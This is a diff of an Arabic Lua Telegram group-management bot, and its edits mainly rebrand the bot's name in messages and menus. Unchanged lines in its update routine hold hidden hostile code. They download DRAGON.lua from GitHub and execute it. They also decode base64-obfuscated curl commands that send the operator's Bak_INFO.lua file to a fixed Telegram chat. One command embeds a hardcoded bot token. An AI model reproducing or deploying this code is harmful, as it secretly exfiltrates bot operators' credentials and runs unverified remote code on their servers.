@@ -1110,11 +1110,11 @@ HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
 CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
 uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
 echo '⇗ نظام التشغيل ⇖•\n*»» '"$linux_version"'*' 
-echo '≪━━━━𝗠𝗨𝗦𝗟𝗘𝗠━━━━≫\n★✔{ الذاكره العشوائيه } ⇎\n*»» '"$memUsedPrc"'*'
-echo '≪━━━━𝗠𝗨𝗦𝗟𝗘𝗠━━━━≫\n★✔{ وحـده الـتـخـزيـن } ⇎\n*»» '"$HardDisk"'*'
-echo '≪━━━━𝗠𝗨𝗦𝗟𝗘𝗠━━━━≫\n★✔{ الـمــعــالــج } ⇎\n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
-echo '≪━━━━𝗠𝗨𝗦𝗟𝗘𝗠━━━━≫\n★✔{ الــدخــول } ⇎\n*»» '`whoami`'*'
-echo '≪━━━━𝗠𝗨𝗦𝗟𝗘𝗠━━━━≫\n★✔{ مـده تـشغيـل الـسـيـرفـر }⇎\n*»» '"$uptime"'*'
+echo '≪━━━━𝒃𝒂𝒌𝒂𝒓━━━━≫\n★✔{ الذاكره العشوائيه } ⇎\n*»» '"$memUsedPrc"'*'
+echo '≪━━━━𝒃𝒂𝒌𝒂𝒓━━━━≫\n★✔{ وحـده الـتـخـزيـن } ⇎\n*»» '"$HardDisk"'*'
+echo '≪━━━━𝒃𝒂𝒌𝒂𝒓━━━━≫\n★✔{ الـمــعــالــج } ⇎\n*»» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
+echo '≪━━━━𝒃𝒂𝒌𝒂𝒓━━━━≫\n★✔{ الــدخــول } ⇎\n*»» '`whoami`'*'
+echo '≪━━━━𝒃𝒂𝒌𝒂𝒓━━━━≫\n★✔{ مـده تـشغيـل الـسـيـرفـر }⇎\n*»» '"$uptime"'*'
 ]]):read('*all'))  
 end
 
@@ -1124,7 +1124,7 @@ os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/black801/Bak/main/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QEJha19JTkZPLmx1YSI'))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3NDc0NzQzNzU6QUFIcmFBeDc4TUVyQ2p5Qm5UVjdla2NCcFUtb1F2eWFBYXMvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AQmFrX0lORk8ubHVhIg'))
-send(msg.chat_id_, msg.id_,' ★ تم تحديث السورس \n★ لديك اخر اصدار لسورس المسلم\n★ الاصدار » {`v1.2.2`}')
+send(msg.chat_id_, msg.id_,' ★ تم تحديث السورس \n★ لديك اخر اصدار لسورس بكار\n★ الاصدار » {`v1.2.2`}')
 dofile('DRAGON.lua')
 end
 
@@ -2363,7 +2363,7 @@ os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/aVAER200/som/main/DRAGON.lua')
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QEJha19JTkZPLmx1YSI'))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3NDc0NzQzNzU6QUFIcmFBeDc4TUVyQ2p5Qm5UVjdla2NCcFUtb1F2eWFBYXMvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AQmFrX0lORk8ubHVhIg'))
-send(msg.chat_id_, msg.id_,' ★ تم تحديث السورس \n ★ لديك اخر اصدار لسورس المسلم\n ★ الاصدار » {`v1.2.2`}')
+send(msg.chat_id_, msg.id_,' ★ تم تحديث السورس \n ★ لديك اخر اصدار لسورس بكار\n ★ الاصدار » {`v1.2.2`}')
 dofile('DRAGON.lua')
 end
 
@@ -4060,8 +4060,8 @@ if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n ★ اهلا بك في متجر ملفات سورس المسلم\n ★ ملفات السورس ↓\n•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•\n\n"
-local TextE = "\n•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•\n ★ علامة تعني { ✔️ } ملف مفعل\n ★ علامة تعني { ✖ } ملف معطل\n ★ قناة سورس المسلم ↓\n".." ★ [اضغط هنا لدخول](t.me/BK_bh1) \n"
+local TextS = "\n ★ اهلا بك في متجر ملفات سورس بكار\n ★ ملفات السورس ↓\n•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•\n\n"
+local TextE = "\n•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•\n ★ علامة تعني { ✔️ } ملف مفعل\n ★ علامة تعني { ✖ } ملف معطل\n ★ قناة سورس بكار ↓\n".." ★ [اضغط هنا لدخول](t.me/BK_bh1) \n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
 local Check_File_is_Found = io.open("File_Bot/"..name,"r")
@@ -8139,9 +8139,9 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, 
 return false
 end
 ---------------------- بداء اضافه مميزات أحمد
-if text == 'العاب المسلم' or text == 'العاب خارقه' or text == 'العاب متطوره' then  
+if text == 'العاب بكار' or text == 'العاب خارقه' or text == 'العاب متطوره' then  
 local Text = [[  
-اهلا في قائمه الالعاب المتطوره سورس المسلم 🎮
+اهلا في قائمه الالعاب المتطوره سورس بكار 🎮
 تفضل اختر لعبه من القائمه
 اول قائمه العاب مكونه من 50 لعبه @UU_bh
 ]]
@@ -8186,7 +8186,6 @@ local TWEET_Msg = {
 "اخر اغنية سمعتها ?", 
 "تكلم عن نفسك", 
 "ليه انت مش سالك", 
-"ليه سميرعسل, 
 "اخر كتاب قرآته", 
 "روايتك المفضله ?", 
 "اخر اكله اكلتها", 
@@ -8202,13 +8201,13 @@ local TWEET_Msg = {
 " ما السيء في هذه الحياة ؟ ", 
 "أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
 "سؤال ينرفزك ؟ ", 
-" هل يعجبك سورس المسلم ؟؟ ", 
+" هل يعجبك سورس بكار ؟؟ ", 
 " اكثر ممثل تحبه ؟ ", 
 "قد تخيلت شي في بالك وصار ؟ ", 
 "شيء عندك اهم من الناس ؟ ", 
 "تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
 "وش أخر شي ضيعته؟ ", 
-"اي رايك في سورس المسلم ؟ ", 
+"اي رايك في سورس بكار ؟ ", 
 "كم مره حبيت؟ ", 
 " اكثر المتابعين عندك باي برنامج؟", 
 " نسبة النعاس عندك حاليًا؟", 
@@ -8640,7 +8639,7 @@ local text =
 ' }\n'..' ★  الايدي » { '..idgp..
 ' }\n'..' ★  الايدي بالصوره » { '..idph..
 ' }\n'..' ★  الرفع » { '..setadd..
-' }\n'..' ★  الحظر » { '..banm..' }\n\n•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•\n ★ قناة سورس المسلم ↓\n [🖨★𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁.](t.me/BK_bh1) \n'
+' }\n'..' ★  الحظر » { '..banm..' }\n\n•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•\n ★ قناة سورس بكار ↓\n [🖨★𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙿𝙾𝚆𝙴𝚁.](t.me/BK_bh1) \n'
 send(msg.chat_id_, msg.id_,text)     
 end
 if text ==('تثبيت') and msg.reply_to_message_id_ ~= 0 and Mod(msg) then  
@@ -9692,8 +9691,8 @@ end
 return false
 end
 
-if text == ""..(database:get(bot_id..'Name:Bot') or 'المسلم').."" then  
-Namebot = (database:get(bot_id..'Name:Bot') or 'المسلم')
+if text == ""..(database:get(bot_id..'Name:Bot') or 'بكار').."" then  
+Namebot = (database:get(bot_id..'Name:Bot') or 'بكار')
 local DRAGON_Msg = {
 'عمغي 🥺💕.',
 'ياروحي كول اني  '..Namebot..'',
@@ -10545,7 +10544,7 @@ if b.username_ then
 User_id = "@"..b.username_
 else
 User_id = msg.sender_user_id_
-end --الكود حصري سورس المسلم يعني لو بكتهن راح اعرفك انت الاخذتهن
+end --الكود حصري سورس بكار يعني لو بكتهن راح اعرفك انت الاخذتهن
 local t = "\n★المستخدم ~ ["..User_id .."] يصيح المشرفين \n•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•\n"
 k = 0
 for i,v in pairs(data.members_) do
@@ -10720,7 +10719,7 @@ end
 end
 
 -------------------------------
-if text == ""..(database:get(bot_id..'Name:Bot') or 'المسلم').."غادر" or text == 'بوت غادر' then  
+if text == ""..(database:get(bot_id..'Name:Bot') or 'بكار').."غادر" or text == 'بوت غادر' then  
 if Sudo(msg) and not database:get(bot_id..'Left:Bot'..msg.chat_id_)  then 
 tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
 send(msg.chat_id_, msg.id_,' ★ تم مغادرة الجروب') 
@@ -11630,7 +11629,7 @@ local List = {
 🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
 🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
 🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
-🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
+🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas ??
 🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @BK_bh1 🦅.
 ]],
@@ -12865,7 +12864,7 @@ local Text =[[
 *يمكنك تصفح الاضافات من خلال*
 *الكيبورد الموجود في الأسفل*
 *•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•*
-★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★
+★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -12875,7 +12874,7 @@ keyboard.inline_keyboard = {
 {text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
 },
 {
-{text = '✶ 𝗠𝗨𝗦𝗟𝗘𝗠 ✶', url="t.me/BK_bh1"},
+{text = '✶ 𝒃𝒂𝒌𝒂𝒓 ✶', url="t.me/BK_bh1"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -12901,7 +12900,7 @@ for k,v in pairs(zx.ok) do
 i = i + 1
 t = t..i.."-  `"..v.."` \n"
 end
-send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•ٴ\n ★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★ ')
+send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•ٴ\n ★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★ ')
 end
 if text == "تعطيل الابراج" and Manager(msg) then
 send(msg.chat_id_, msg.id_, '★ تم تعطيل الابراج')
@@ -13099,7 +13098,7 @@ local Teext =[[
 ★ الجهات
 ★ الاشعارات
 •┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•
-★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★
+★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -13158,7 +13157,7 @@ local Teext =[[
 ★ اوامر التسليه
 ★ صورتي 
 •┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•
-★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★
+★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -13228,7 +13227,7 @@ local Teext =[[
 •┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•
 ★ الاوامر المضافه ( لعرض الاوامر المضافه ) 
 •┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•
-★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★
+★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -13331,7 +13330,7 @@ local Teext =[[
 ★ الساعه
 ★ التاريخ
 •┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•
-★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★
+★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -13424,7 +13423,7 @@ local Teext =[[
 ★ تفعيل/تعطيل المغادره
 ★ مسح الجروبات
 •┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•
-★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★
+★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -13477,7 +13476,7 @@ local Teext =[[
 ★ شنو رئيك بهاي بالرد
 ★ تحب هذا
 •┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•
-★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★
+★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -13551,7 +13550,7 @@ local Teext =[[
 ★ تاك للمتزوجين
 ★ مسح المتزوجين
 •┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•
-★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★
+★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -13627,7 +13626,7 @@ keyboard.inline_keyboard = {
 {text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
 },
 {
-{text = '✶ 𝗠𝗨𝗦𝗟𝗘𝗠 ✶', url="t.me/BK_bh1"},
+{text = '✶ 𝒃𝒂𝒌𝒂𝒓 ✶', url="t.me/BK_bh1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -13660,7 +13659,7 @@ keyboard.inline_keyboard = {
 {text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
 },
 {
-{text = '✶ 𝗠𝗨𝗦𝗟𝗘𝗠 ✶', url="t.me/BK_bh1"},
+{text = '✶ 𝒃𝒂𝒌𝒂𝒓 ✶', url="t.me/BK_bh1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -13690,7 +13689,7 @@ keyboard.inline_keyboard = {
 {text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
 },
 {
-{text = '✶ 𝗠𝗨𝗦𝗟𝗘𝗠 ✶', url="t.me/BK_bh1"},
+{text = '✶ 𝒃𝒂𝒌𝒂𝒓 ✶', url="t.me/BK_bh1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -13720,7 +13719,7 @@ keyboard.inline_keyboard = {
 {text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
 },
 {
-{text = '✶ 𝗠𝗨𝗦𝗟𝗘𝗠 ✶', url="t.me/BK_bh1"},
+{text = '✶ 𝒃𝒂𝒌𝒂𝒓 ✶', url="t.me/BK_bh1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -13750,7 +13749,7 @@ keyboard.inline_keyboard = {
 {text = '🔙 القائمة الرئيسيه 🔙', callback_data="/add"},
 },
 {
-{text = '✶ 𝗠𝗨𝗦𝗟𝗘𝗠 ✶', url="t.me/BK_bh1"},
+{text = '✶ 𝒃𝒂𝒌𝒂𝒓 ✶', url="t.me/BK_bh1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -13771,7 +13770,7 @@ local Teext =[[
 *يمكنك تصفح الاضافات من خلال*
 *الكيبورد الموجود في الأسفل*
 *•┉ • ┉ • ┉ 𝒃𝒂𝒌𝒂𝒓 ┉ • ┉ • ┉•*
-★[𝗠𝗨𝗦𝗟𝗘𝗠](t.me/BK_bh1)★
+★[𝒃𝒂𝒌𝒂𝒓](t.me/BK_bh1)★
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -13782,7 +13781,7 @@ keyboard.inline_keyboard = {
 {text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
 },
 {
-{text = '✶ 𝗠𝗨𝗦𝗟𝗘𝗠 ✶', url="t.me/BK_bh1"},
+{text = '✶ 𝒃𝒂𝒌𝒂𝒓 ✶', url="t.me/BK_bh1"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -13824,7 +13823,7 @@ if (text and text == "تفعيل اوامر التسليه") then
 send(msg.chat_id_, msg.id_, '  ★ تم تفعيل اوامر التسليه')
 database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
 end
-local Name_Bot = (database:get(bot_id..'Name:Bot') or 'المسلم')
+local Name_Bot = (database:get(bot_id..'Name:Bot') or 'بكار')
 if not database:get(bot_id.."Fun_Bots:"..msg.chat_id_) then
 if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
 function FunBot(extra, result, success) 
